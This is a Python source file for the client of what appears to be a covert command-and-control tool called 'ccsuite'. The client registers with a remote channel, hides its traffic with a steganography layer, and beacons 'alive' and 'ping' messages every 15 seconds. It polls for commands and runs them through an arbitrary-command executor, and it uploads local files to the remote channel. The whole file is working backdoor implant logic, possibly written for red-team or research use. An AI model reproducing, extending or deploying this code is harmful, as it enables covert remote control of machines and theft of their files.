import os.path
import time

from ccsuite.ccchanel import ccchanel_log as cclog
from ccsuite.ccchanel.ccchanel_base import CCChanelBase
from ccsuite.ccchanel import ccchanel_messages as cpayload
from ccsuite.client import exec as cexec
from ccsuite.steno.steno_base import CCStenoBase


class CCClient(object):
    def __init__(self, ccchanel: CCChanelBase, steno_: CCStenoBase):
        self.ccchanel = ccchanel
        self.steno_base = steno_
        self.id = 'client'
        self.log_root = '/tmp/ccsuite'
        self.own_log = os.path.join(self.log_root, self.id)
        self.exit_flag = False

    def is_registered(self):
        return self.id in self.ccchanel.list(self.log_root)

    def register(self):
        cclog.log_init(self.ccchanel, self.own_log, self.steno_base)

    def tell_alive(self):
        cclog.log_append(self.ccchanel, self.own_log, cpayload.message_create_alive(), self.steno_base)

    def get_command(self):
        log = cclog.log_read(self.ccchanel, self.own_log, self.steno_base)
        dones = []
        for log_entry in reversed(log):
            if log_entry.get('done', False):
                dones += [log_entry['done']['id']]
            elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
                return log_entry.get('command')
        return None

    def execute_command(self, local_path, *args):
        if local_path == 'upload':
            local_file_path = args[0]
            remote_file_path = os.path.join(self.log_root, local_file_path.replace('/', '_'))
            print(f"CLIENT: executing upload {local_file_path}")
            self.ccchanel.write(local_file_path, remote_file_path)
            return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
        else:
            return cexec.execute_arbitrary_command(local_path, *args)

    def log_append(self, payload):
        return cclog.log_append(self.ccchanel, self.own_log, payload, self.steno_base)

    def run(self):
        sleep_time = 15
        # id = cid.id()
        if not self.is_registered():
            self.register()
        self.tell_alive()
        while not self.exit_flag:
            cmd = self.get_command()
            if cmd is not None:
                cmd_id = cmd['timestamp']
                exec_out = self.execute_command(cmd['kind'], *cmd['args']).decode()
                self.log_append(cpayload.message_create_done(cmd_id, exec_out))
            print(f"SLEEP {sleep_time}")
            time.sleep(sleep_time)
            self.log_append(cpayload.message_create_ping())
